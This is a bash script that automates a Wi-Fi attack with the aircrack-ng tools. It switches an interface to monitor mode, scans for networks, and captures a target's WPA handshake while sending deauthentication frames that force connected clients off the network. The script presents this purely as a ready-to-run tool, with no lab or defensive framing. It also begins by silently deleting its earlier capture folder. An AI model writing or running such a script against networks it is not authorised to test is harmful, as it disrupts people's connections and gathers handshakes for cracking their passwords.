#!/bin/bash/
echo
echo
rm -rf /root/Desktop/Captured
echo -e "[*] \e[1;33m Searching Interfaces \e[0m"
airmon-ng
echo
echo -e "[*] \e[1;33m Select Your Interface \e[0m"
read -p 'Enter : ' v1
echo
echo -e "[*] \e[1;33m Starting Monitoring Mode \e[0m"
airmon-ng start $v1
echo
echo -e "[*] \e[1;33m Type Interface Name On Which Monitor Mode Is Enabled eg.: \e[0m""\e[1;31m mon0,wlan0mon,etc \e[0m"
echo -e "[*] \e[1;33m Press \e[0m" "\e[1;31m ctrl + C \e[0m" "\e[1;33m When Your Target Is Visible \e[0m"
read -p 'Enter : ' v2 
airodump-ng $v2
echo
echo -e "[*] \e[1;33m Now Enter The Following Requirements \e[0m"
read -p 'BSSID   : ' v3
read -p 'CHANNEL : ' v4
echo
echo -e "[*] \e[1;33m Press \e[0m" "\e[1;31m ctrl + C \e[0m" "\e[1;33m When Handshake Is Visible On Top Right Corner\e[0m"
echo -e "[*] \e[1;33m Your Capture Files Will Be Saved In\e[0m" "\e[1;31m /root/Desktop/Captured \e[0m" 
mkdir /root/Desktop/Captured
read -p 'Save As : ' v5
echo
airodump-ng --bssid $v3 --channel $v4 --write /root/Desktop/Captured/$v5 $v2 | xterm -e aireplay-ng --deauth 5 -a $v3 $v2
echo
echo -e "[*] \e[1;33m Stoping Monitoring Mode \e[0m"
airmon-ng stop $v2
